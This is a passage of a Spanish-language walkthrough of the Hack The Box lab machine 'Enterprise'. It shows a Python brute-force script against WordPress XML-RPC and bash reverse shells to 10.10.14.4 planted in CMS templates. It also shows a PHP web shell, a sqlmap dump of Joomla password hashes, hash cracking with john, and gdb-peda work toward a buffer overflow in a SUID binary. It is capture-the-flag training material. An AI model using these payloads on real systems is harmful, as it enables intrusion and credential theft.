\u0026lt;value\u0026gt;\u0026lt;string\u0026gt;wp.deletePost\u0026lt;/string\u0026gt;\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;\u0026lt;string\u0026gt;wp.editPost\u0026lt;/string\u0026gt;\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;\u0026lt;string\u0026gt;wp.newPost\u0026lt;/string\u0026gt;\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;\u0026lt;string\u0026gt;wp.getUsersBlogs\u0026lt;/string\u0026gt;\u0026lt;/value\u0026gt; \u0026lt;/data\u0026gt;\u0026lt;/array\u0026gt; \u0026lt;/value\u0026gt; \u0026lt;/param\u0026gt; \u0026lt;/params\u0026gt; \u0026lt;/methodResponse\u0026gt; El método wp.getUsersBlogs está disponible, con este método podemos hacer fuerza bruta con la siguiente data sustituyendo el parámetro username por el usuario y password por la contraseña\n\u0026lt;?xml version=\\\u0026#34;1.0\\\u0026#34; encoding=\\\u0026#34;UTF-8\\\u0026#34;?\u0026gt; \u0026lt;methodCall\u0026gt; \u0026lt;methodName\u0026gt;wp.getUsersBlogs\u0026lt;/methodName\u0026gt; \u0026lt;params\u0026gt; \u0026lt;param\u0026gt;\u0026lt;value\u0026gt;USERNAME\u0026lt;/value\u0026gt;\u0026lt;/param\u0026gt; \u0026lt;param\u0026gt;\u0026lt;value\u0026gt;PASSWORD\u0026lt;/value\u0026gt;\u0026lt;/param\u0026gt; \u0026lt;/params\u0026gt; \u0026lt;/methodCall\u0026gt; Al mandar esta petición recibimos lo siguiente\ncurl -X POST \u0026ldquo;http://enterprise.htb/xmlrpc.php\u0026rdquo; -d@data.xml\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;methodResponse\u0026gt; .... \u0026lt;value\u0026gt;\u0026lt;string\u0026gt;Incorrect username or password.\u0026lt;/string\u0026gt;\u0026lt;/value\u0026gt; .... \u0026lt;/methodResponse\u0026gt; Ahora vamos a hacer un script en python para automatizar esta comprobación de usuarios y guardaremos todos las contraseñas en un archivo llamado passwords.txt\nimport requests from pwn import * url = \u0026#34;http://enterprise.htb/xmlrpc.php\u0026#34; dict = \u0026#34;passwords.txt\u0026#34; user = \u0026#34;william.riker\u0026#34; data = \u0026#34;\u0026#34;\u0026#34; \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;methodCall\u0026gt; \u0026lt;methodName\u0026gt;wp.getUsersBlogs\u0026lt;/methodName\u0026gt; \u0026lt;params\u0026gt; \u0026lt;param\u0026gt;\u0026lt;value\u0026gt;{}\u0026lt;/value\u0026gt;\u0026lt;/param\u0026gt; \u0026lt;param\u0026gt;\u0026lt;value\u0026gt;{}\u0026lt;/value\u0026gt;\u0026lt;/param\u0026gt; \u0026lt;/params\u0026gt; \u0026lt;/methodCall\u0026gt; \u0026#34;\u0026#34;\u0026#34; p1 = log.progress(\u0026#34;Número de contraseñas probadas\u0026#34;) p2 = log.progress(\u0026#34;Contraseña\u0026#34;) words = 0 with open(dict, \u0026#39;r\u0026#39;) as diccionario: for i in diccionario: words += 1 p1.status(words) a = requests.post(url, data=data.format(user, i)) if \u0026#34;Incorrect username or password\u0026#34; not in a.text: p2.success(i) p1.success(words) Al principio del script se declaran 4 variables, la url con la ruta del xmlrpc.php, el diccionario de posibles contraseñas, el usuario con el cual se van a probar las contraseñas y la data que se va a mandar por post, con unos \u0026ldquo;{}\u0026rdquo; donde iría el user y la pass, indicando que ahí va a ir una variable que haremos más adelante. Después abrimos el diccionario y hacemos un bucle for por cada línea que haya en el diccionario. A continuación se manda una solicitud con la contraseña que toca en la iteración del diccionario y se comprueba si la respuesta contiene la frase \u0026ldquo;Incorrect username or password\u0026rdquo;. Si no contiene esa frase significa que las credenciales son correctas\npython3 script.py [+] Número de contraseñas probadas: 4 [+] Contraseña: u*Z14ru0p#ttj83zS6 Ahora ya tenemos la contraseña del wordpress y podemos iniciar sesión en /wp-admin, una vez iniciada la sesión para mandarnos una reverse shell simplemente vamos a Appearance \u0026gt; Editor \u0026gt; 404 template. Vamos a modificar el 404.php que es el que se muestra cuando vamos a una ruta equivocada y vamos a añadir la siguiente línea\nsystem(\u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.4/443 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39;); Nos ponemos en escucha con netcat\nnc -nlvp 443 Explicación parámetros\rn: Sirve para que no haga la resolución de DNS l: Habilitar modo escucha de netcat v: Verbose, modo detallado de netcat p: Por último la p sirve para especificar el número de puerto en el cual vamos a estar en escucha Por último hacemos un curl a un post que no exsísta\ncurl http://enterprise.htb/?p=10000000 Y recibimos la conexión\nlistening on [any] 443 ... connect to [10.10.14.4] from (UNKNOWN) [10.10.10.61] 32890 bash: cannot set terminal process group (1): Inappropriate ioctl for device bash: no job control in this shell www-data@b8319d86d21e:/var/www/html$ Antes de la escalada, vamos a hacer un tratamiento de la tty para poder ejecutar ctr + c, ctrl + l, nano\u0026hellip;\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm Ahora si hacemos un echo $TERM vemos que vale dumb, pero para poder hacer ctrl + l necesitamos que valga xterm\nexport TERM=xterm Por último si miramos la shell que tenemos echo $SHELL vemos que tenemos /usr/sbin/nologin asi que vamos a asignar una bash\nexport SHELL=bash Al ver nuestra ip vemos que no es la de la máquina víctima:\nwww-data@b8319d86d21e:/var/www/html$ ip a 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever 6: eth0@if7: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff inet 172.17.0.3/16 scope global eth0 valid_lft forever preferred_lft forever Si listamos el contenido de la raíz vemos que estamos en un contenedor docker por la existencia del archivo .dockerenv\nwww-data@b8319d86d21e:/var/www/html$ ls -la / total 72 drwxr-xr-x 73 root root 4096 May 30 2022 . drwxr-xr-x 73 root root 4096 May 30 2022 .. -rwxr-xr-x 1 root root 0 Sep 3 2017 .dockerenv Volviendo al tema de la ip hemos visto que tenemos la 172.17.0.3 la 172.17.0.1 es la máquina host que seguramente será la 10.10.10.61. Pero es raro que se nos haya asignado la ip 172.17.0.3 y no la 172.17.0.2, puede ser que haya más de un contenedor docker y que en la .2 haya un contenedor. Esto lo podemos comprobar con un ping.\nwww-data@b8319d86d21e:/var/www/html$ ping -c 1 172.17.0.2 PING 172.17.0.2 (172.17.0.2): 56 data bytes 64 bytes from 172.17.0.2: icmp_seq=0 ttl=64 time=0.061 ms --- 172.17.0.2 ping statistics --- 1 packets transmitted, 1 packets received, 0% packet loss round-trip min/avg/max/stddev = 0.061/0.061/0.061/0.000 ms Efectivamente existe un contenedor en la .2. Si volvemos al inicio, había una tercera web corriendo por el puerto 8080, antes de entrar vamos a hacerle un whatweb como la de wordpress para ver que es.\nwhatweb 10.10.10.61:8080 http://10.10.10.61:8080 [200 OK] Apache[2.4.10], Bootstrap, Cookies[14cd8f365a67fad648754407628a1809], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.10 (Debian)], HttpOnly[14cd8f365a67fad648754407628a1809], IP[10.10.10.61], JQuery, MetaGenerator[Joomla! - Open Source Content Management], PHP[7.0.23], PasswordField[password], Script[application/json], Title[Home], X-Powered-By[PHP/7.0.23] ¡Es un joomla! Sí recordamos en la sqli de wordpress había una base de datos de joomla así que podemos sacar usuarios y contraseñas. Primero enumeramos las tablas.\nsqlmap --url \u0026#34;http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1\u0026#34; --batch -D joomladb --tables Database: joomladb [72 tables] +-------------------------------+ | edz2g_assets | | edz2g_associations | | edz2g_banner_clients | | edz2g_banner_tracks | | edz2g_banners | | edz2g_categories | | edz2g_contact_details | | edz2g_content | | edz2g_content_frontpage | | edz2g_content_rating | | edz2g_content_types | | edz2g_contentitem_tag_map | | edz2g_core_log_searches | | edz2g_extensions | | edz2g_fields | | edz2g_fields_categories | | edz2g_fields_groups | | edz2g_fields_values | | edz2g_finder_filters | | edz2g_finder_links | | edz2g_finder_links_terms0 | | edz2g_finder_links_terms1 | | edz2g_finder_links_terms2 | | edz2g_finder_links_terms3 | | edz2g_finder_links_terms4 | | edz2g_finder_links_terms5 | | edz2g_finder_links_terms6 | | edz2g_finder_links_terms7 | | edz2g_finder_links_terms8 | | edz2g_finder_links_terms9 | | edz2g_finder_links_termsa | | edz2g_finder_links_termsb | | edz2g_finder_links_termsc | | edz2g_finder_links_termsd | | edz2g_finder_links_termse | | edz2g_finder_links_termsf | | edz2g_finder_taxonomy | | edz2g_finder_taxonomy_map | | edz2g_finder_terms | | edz2g_finder_terms_common | | edz2g_finder_tokens | | edz2g_finder_tokens_aggregate | | edz2g_finder_types | | edz2g_languages | | edz2g_menu | | edz2g_menu_types | | edz2g_messages | | edz2g_messages_cfg | | edz2g_modules | | edz2g_modules_menu | | edz2g_newsfeeds | | edz2g_overrider | | edz2g_postinstall_messages | | edz2g_redirect_links | | edz2g_schemas | | edz2g_session | | edz2g_tags | | edz2g_template_styles | | edz2g_ucm_base | | edz2g_ucm_content | | edz2g_ucm_history | | edz2g_update_sites | | edz2g_update_sites_extensions | | edz2g_updates | | edz2g_user_keys | | edz2g_user_notes | | edz2g_user_profiles | | edz2g_user_usergroup_map | | edz2g_usergroups | | edz2g_users | | edz2g_utf8_conversion | | edz2g_viewlevels | +-------------------------------+ Ahora vamos a ver el contenido de la tabla edz2g_users\nsqlmap --url \u0026#34;http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1\u0026#34; --batch -D joomladb -T edz2g_users --dump Database: joomladb Table: edz2g_users [2 entries] +-----+---------+--------------------------------+------------+---------+----------------------------------------------------------------------------------------------+---------+--------------------------------------------------------------+-----------------+-----------+------------+------------+---------------------+--------------+---------------------+---------------------+ | id | otep | email | name | otpKey | params | block | password | username | sendEmail | activation | resetCount | registerDate | requireReset | lastResetTime | lastvisitDate | +-----+---------+--------------------------------+------------+---------+----------------------------------------------------------------------------------------------+---------+--------------------------------------------------------------+-----------------+-----------+------------+------------+---------------------+--------------+---------------------+---------------------+ | 400 | \u0026lt;blank\u0026gt; | geordi.la.forge@enterprise.htb | Super User | \u0026lt;blank\u0026gt; | {\u0026#34;admin_style\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;admin_language\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;language\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;editor\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;helpsite\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;timezone\u0026#34;:\u0026#34;\u0026#34;} | 0 | $2y$10$cXSgEkNQGBBUneDKXq9gU.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy | geordi.la.forge | 1 | 0 | 0 | 2017-09-03 19:30:04 | 0 | 0000-00-00 00:00:00 | 2017-10-17 04:24:50 | | 401 | \u0026lt;blank\u0026gt; | guinan@enterprise.htb | Guinan | \u0026lt;blank\u0026gt; | {\u0026#34;admin_style\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;admin_language\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;language\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;editor\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;helpsite\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;timezone\u0026#34;:\u0026#34;\u0026#34;} | 0 | $2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q | Guinan | 0 | \u0026lt;blank\u0026gt; | 0 | 2017-09-06 12:38:03 | 0 | 0000-00-00 00:00:00 | 0000-00-00 00:00:00 | +-----+---------+--------------------------------+------------+---------+----------------------------------------------------------------------------------------------+---------+--------------------------------------------------------------+-----------------+-----------+------------+------------+---------------------+--------------+---------------------+---------------------+ Vemos 2 usuarios con sus respectivas credenciales hasheadas las cuales podemos tratar de romper con john\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash Using default input encoding: UTF-8 Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status Lo dejé un buen rato, pero no las encuentra. Puede ser que alguna de las credenciales que había en el post de wordpress sean las del joomla. Con este script podemos hacer fuerza bruta para encontrar las credenciales correctas del joomla\npython3 joomla-brute.py -u http://10.10.10.61:8080 -usr geordi.la.forge -w passwords.txt geordi.la.forge:ZD3YxfnSjezg67JZ Ya tenemos credenciales válidas para el Joomla como Super user. Para mandarnos la reverse shell es bastante parecido a wordpress, simplemente hay que ir a Extensions \u0026gt; Templates \u0026gt; Templates \u0026gt; El tema que esté en uso \u0026gt; error.php y pegamos el mismo código de wordpress.\nsystem(\u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.4/443 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39;); Nos ponemos en escucha con netcat\nnc -nlvp 443 Explicación parámetros\rn: Sirve para que no haga la resolución de DNS l: Habilitar modo escucha de netcat v: Verbose, modo detallado de netcat p: Por último la p sirve para especificar el número de puerto en el cual vamos a estar en escucha Y hacemos un curl a una página random que no exista de la web.\ncurl http://10.10.10.61:8080/testing ¡Recibimos la conexión!\nlistening on [any] 443 ... connect to [10.10.14.4] from (UNKNOWN) [10.10.10.61] 42390 bash: cannot set terminal process group (1): Inappropriate ioctl for device bash: no job control in this shell www-data@a7018bfdc454:/var/www/html$ Antes de seguir, vamos a hacer un tratamiento de la tty para poder ejecutar ctr + c, ctrl + l, nano\u0026hellip;\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm Ahora si hacemos un echo $TERM vemos que vale dumb, pero para poder hacer ctrl + l necesitamos que valga xterm\nexport TERM=xterm Por último si miramos la shell que tenemos echo $SHELL vemos que tenemos /usr/sbin/nologin asi que vamos a asignar una bash\nexport SHELL=bash Si hacemos un ip a vemos que estamos en un contenedor distinto al de wordpress\n1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever 8: eth0@if9: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:ac:11:00:04 brd ff:ff:ff:ff:ff:ff inet 172.17.0.4/16 scope global eth0 valid_lft forever preferred_lft forever Escalada de privilegios Saliendo del docker En la consola que hemos obtenido con el Joomla si vamos a /var/www/html vemos que hay una carpeta llamada files, dentro de la carpeta hay un lcars.zip. Esto es lo mismo que veiamos desde la web que corria por el puerto 443, puede ser que tengan esta carpeta sincronizada. Dentro de la carpeta files tenemos capazidad de escritura, podemos poner un php malicioso e intentarlo ejecutar desde la web que corre por el puerto 443.\n8bfdc454:/var/www/html/files$ echo \u0026#39;\u0026lt;?php system($_GET[\u0026#34;cmd\u0026#34;]); ?\u0026gt;\u0026#39; \u0026gt; script.php Ahora si entramos en la web, abrimos el script.php y por get por el parametro cmd le ponemos un comando vemos el resultado\nhttps://10.10.10.61/files/script.php?cmd=ls Para mandar la reversres shell vamos a usar lo mismo de siempre (bash -c \u0026ldquo;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.4/443 0\u0026gt;\u0026amp;1\u0026rdquo;) pero lo vamos a passar por un url encoder para que no de problemas\nhttps://10.10.10.61/files/script.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.4%2F443%200%3E%261%22 Nos ponemos en escucha con netcat\nnc -nlvp 443 Explicación parámetros\rn: Sirve para que no haga la resolución de DNS l: Habilitar modo escucha de netcat v: Verbose, modo detallado de netcat p: Por último la p sirve para especificar el número de puerto en el cual vamos a estar en escucha Recibimos la conexión!\nlistening on [any] 443 ... connect to [10.10.14.4] from (UNKNOWN) [10.10.10.61] 37558 bash: cannot set terminal process group (1531): Inappropriate ioctl for device bash: no job control in this shell www-data@enterprise:/var/www/html/files$ Antes de continuar con la escalada, vamos a hacer un tratamiento de la tty para poder ejecutar ctr + c, ctrl + l, nano\u0026hellip;\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm Ahora si hacemos un echo $TERM vemos que vale dumb pero para poder hacer ctrl + l necesitamos que valga xterm\nexport TERM=xterm Por ultimo si miramos la shell que tenemos echo $SHELL vemos que tenemos /usr/sbin/nologin asi que vamos a asignar una bash\nexport SHELL=bash root Buscando archivos con permisos SUID vemos que existe uno llamado lcars (Como el plugin), el cual su propietario es root y tiene permisos SUID así que si lo ejecutamos lo estamos ejecutando como root\nwww-data@enterprise:/$ find / -perm -4000 -exec ls -ldb {} \\; 2\u0026gt;/dev/null ..... -rwsr-xr-x 1 root root 38984 May 18 2017 /bin/mount -rwsr-xr-x 1 root root 12152 Sep 8 2017 /bin/lcars -rwsr-xr-x 1 root root 30800 Aug 11 2016 /bin/fusermount El binario lcars nos lo vamos a pasar a nuestra máquina para poder analizarlo con detalle, para pasárnoslo, vamos a montar un servidor con python por el puerto 8000 en la carpeta /bin desde la máquina víctima con python3 -m http.server 8000 y nos lo vamos a descargar a nuestra máquina con wget 10.10.10.61/lcars\nBuffer Overflow Para analizar el binario usaremos la herramienta ghydra.\nUna vez estamos en ghydra gracias al “auto analyze” podemos ver el código del binario. Primero vamos a ver el contenido de la función main.\nundefined4 main(void) { char local_19 [9]; undefined *local_10; local_10 = \u0026amp;stack0x00000004; setresuid(0,0,0); startScreen(); puts(\u0026#34;Enter Bridge Access Code: \u0026#34;); fflush(_stdout); fgets(local_19,9,_stdin); bridgeAuth(local_19); return 0; } En la función main vemos que se declara una variable de caracteres llamada local_19 con un máximo de 9 en el tamaño del buffer. Después se llama a la función startScreen(), la cual se encarga de mostrar el baner del programa.\nvoid startScreen(void) { puts(\u0026#34;\u0026#34;); puts(\u0026#34; _______ _______ ______ _______\u0026#34;); puts(\u0026#34; | | |_____| |_____/ |______\u0026#34;); puts(\u0026#34; |_____ |_____ | | | \\\\_ ______|\u0026#34;); puts(\u0026#34;\u0026#34;); puts(\u0026#34;Welcome to the Library Computer Access and Retrieval System\\n\u0026#34;); return; } Volviendo a la función main, en la siguiente línea después de mencionar startScreen() nos muestra el siguiente texto.\nputs(\u0026ldquo;Enter Bridge Access Code: \u0026ldquo;);\nEl valor que le ponemos lo manda a la función bridgeAuth()\nbridgeAuth(local_19);\nLa función bridgeAuth tiene el siguiente código\nvoid bridgeAuth(char *param_1) { char local_32; undefined uStack_31; undefined uStack_30; undefined uStack_2f; undefined uStack_2e; undefined uStack_2d; undefined uStack_2c; undefined uStack_2b; undefined uStack_2a; int local_14; undefined4 local_10; local_32 = \u0026#39;p\u0026#39;; uStack_31 = 0x69; uStack_30 = 99; uStack_2f = 0x61; uStack_2e = 0x72; uStack_2d = 100; uStack_2c = 0x61; uStack_2b = 0x31; local_10 = 9; uStack_2a = 0; local_14 = strcmp(param_1,\u0026amp;local_32); if (local_14 == 0) { main_menu(); } else { puts(\u0026#34;\\nInvalid Code\\nTerminating Console\\n\u0026#34;); } fflush(_stdout); /* WARNING: Subroutine does not return */ exit(0); } En las variables uStack se les da un valor que empieza por 0x lo que indica que el número que va después del 0x está en hexadecimal. Sabiendo esto, podemos convertir el valor que se les está dando a texto plano.\nlocal_32 = \u0026#39;p\u0026#39;; uStack_31 = \u0026#39;i\u0026#39;; uStack_30 = \u0026#39;c\u0026#39;; uStack_2f = \u0026#39;a\u0026#39;; uStack_2e = \u0026#39;r\u0026#39;; uStack_2d = \u0026#39;d\u0026#39;; uStack_2c = \u0026#39;a\u0026#39;; uStack_2b = \u0026#39;1\u0026#39;; A continuación se comprueba si nuestro input es igual a picarda1 con el siguiente código.\nlocal_14 = strcmp(param_1, \u0026amp;local_32); Si la comprobación anterior da 0 significará que las cadenas son iguales, en caso contrario las cadenas no serían iguales. if (local_14 == 0) { main_menu(); } else { puts(\u0026#34;\\nInvalid Code\\nTerminating Console\\n\u0026#34;); } Al poner el código de acceso correcto nos redirige a la funcion main_menu()\nvoid main_menu(void) { undefined4 local_d8 [52]; local_d8[0] = 0; startScreen(); puts(\u0026#34;\\n\u0026#34;); puts(\u0026#34;LCARS Bridge Secondary Controls -- Main Menu: \\n\u0026#34;); puts(\u0026#34;1. Navigation\u0026#34;); puts(\u0026#34;2. Ships Log\u0026#34;); puts(\u0026#34;3. Science\u0026#34;); puts(\u0026#34;4. Security\u0026#34;); puts(\u0026#34;5. StellaCartography\u0026#34;); puts(\u0026#34;6. Engineering\u0026#34;); puts(\u0026#34;7. Exit\u0026#34;); puts(\u0026#34;Waiting for input: \u0026#34;); fflush(_stdout); __isoc99_scanf(\u0026amp;DAT_00010f92,local_d8); /* WARNING: Could not find normalized switch variable to match jumptable */ /* WARNING: This code block may not be properly labeled as switch case */ unable(); return; } La función main_menu() es la que se encarga de mostrarnos el menú de opciones después de entrar con el codigó correcto (picarda1)\nNo podemos ver a que funciones nos redirige al seleccionar una opción, pero investigando otras funciones que reporta ghydra, vemos que existe una función llamada disableForcefields\nvoid disableForcefields(void) { undefined local_d4 [204]; startScreen(); puts(\u0026#34;Disable Security Force Fields\u0026#34;); puts(\u0026#34;Enter Security Override:\u0026#34;); fflush(_stdout); __isoc99_scanf(\u0026amp;DAT_00010ec4,local_d4); printf(\u0026#34;Rerouting Tertiary EPS Junctions: %s\u0026#34;,local_d4); return; } Los mensajes de Disable Security Force Fields y Enter Security Override: son los que se muestran en la opción 4, así que podemos intuir que es el código de la opción 4\nLCARS Bridge Secondary Controls \u0026ndash; Main Menu:\nNavigation Ships Log Science Security StellaCartography Engineering Exit Waiting for input: 4\nDisable Security Force Fields Enter Security Override:\nVamos a analizar esta función. Primero de todo se crea una variable donde se va a almacenar nuestro input, esta variable va a tener un tamaño máximo de buffer asignado de 204.\nundefined local_d4 [204] Después nos devuelve el mensaje Rerouting Tertiary EPS Junctions acompañado de nuestro input\nprintf(\u0026#34;Rerouting Tertiary EPS Junctions: %s\u0026#34;,local_d4); Si probamos de ejecutar el binario poniendo muchos caracteres:\nEnter Security Override: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA zsh: segmentation fault ./lcars Vemos el error segmentation fault así que podemos probar de llevar a cabo un buffer overflow\nVamos a usar gdb-peda para verlo mejor gdb ./lcars -q una vez dentro le ponemos una r para ejecutarlo y volvemos a llenar el input de la opción 4 para ver si reescribimos los registros.\n[----------------------------------registers-----------------------------------] EAX: 0x2de EBX: 0x41414141 (\u0026#39;AAAA\u0026#39;) ECX: 0xffffcd7c --\u0026gt; 0x38cf2a00 EDX: 0x1 ESI: 0x56555d30 (\u0026lt;__libc_csu_init\u0026gt;:\tpush ebp) EDI: 0xf7ffcba0 --\u0026gt; 0x0 EBP: 0x41414141 (\u0026#39;AAAA\u0026#39;) ESP: 0xffffcf80 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...) EIP: 0x41414141 (\u0026#39;AAAA\u0026#39;) EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) Vemos que efectivamente el EIP vale 0x41414141 que como vimos anteriormente lo que va después del 0x está en hexadecimal, y 41 en hexadecimal es una A, así que hemos conseguido reescribirlo.\nAhora el objetivo sería saber cuantos caracteres tenemos que poner para sobreescribir el EIP y así tener control sobre el valor del EIP. gdb-peda tiene una utilidad para detectar el número de caracteres necesarios. Primero creamos una cadena de caracteres con pattern_create la cual aunque parezca aleatoria, tiene un sentido, ya que no tiene repeticiones, lo que nos permitirá luego encontrar el tamaño de caracteres para llegar al EIP\n\u0026gt; gdb ./lcars -q Reading symbols from ./lcars... (No debugging symbols found in ./lcars) gdb-peda$ pattern_create 500 \u0026#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A\u0026#39; gdb-peda$ r Enter Security Override: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A [----------------------------------registers-----------------------------------] EAX: 0x216 EBX: 0x73254125 (\u0026#39;%A%s\u0026#39;) ECX: 0xffffcd7c --\u0026gt; 0xaab80000 EDX: 0x1 ESI: 0x56555d30 (\u0026lt;__libc_csu_init\u0026gt;:\tpush ebp) EDI: 0xf7ffcba0 --\u0026gt; 0x0 EBP: 0x41422541 (\u0026#39;A%BA\u0026#39;) ESP: 0xffffcf80 (\u0026#34;nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$A\u0026#34;...) EIP: 0x25412425 (\u0026#39;%$A%\u0026#39;) EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) Ahora nos reporta que el EIP vale ($%$A%) podríamos contar manualmente o poner el siguiente comando el cual lo cuenta automaticamente\ngdb-peda$ pattern offset $eip 625026085 found at offset: 212 Nos reporta que necesitamos poner 212 caracteres para empezar a sobreescribir el EIP. Podemos comprobar que efectivamente se necesitan 212 caracteres de la siguiente forma:\nPrimero generamos una cadena de texto de 212 ‘A’ y le añadimos 4 ‘B’. Si gdb-peda no se ha equivocado el eip debería valer ‘BBBB’\nEnter Security Override: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB Program received signal SIGSEGV, Segmentation fault. [----------------------------------registers-----------------------------------] EAX: 0xfa EBX: 0x41414141 (\u0026#39;AAAA\u0026#39;) ECX: 0xffffcd7c --\u0026gt; 0xa714c800 EDX: 0x1 